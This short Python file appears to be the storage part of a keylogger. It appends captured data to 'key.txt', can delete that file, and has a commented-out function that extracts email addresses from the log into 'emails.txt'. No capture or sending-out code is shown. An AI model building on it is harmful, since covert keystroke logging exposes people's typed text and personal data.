import os
import re

path = os.path.dirname(os.path.abspath(__file__))
script_path_key = os.path.join(path, 'key.txt')
script_path_emails = os.path.join(path, 'emails.txt')


def save_to_file(data):
    file = open(script_path_key, 'a')
    file.write(data)
    file.close()


def clear_key():
    if os.path.exists(script_path_key):
        os.remove(script_path_key)



# def looking_for_emails():
#     patern_one = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")
#     file = open(script_path_key, 'r')
#     text = file.read()
#     match = patern_one.search(text)
#     if match:
#         file_2 = open(script_path_emails, 'a')
#         file_2.write(str(match.group()))
#         file.close()
#         file_2.close()
#         text = text.replace(str(match.group()), "")
#         file = open(script_path_key, 'w')
#         file.write(text)
#         file.close()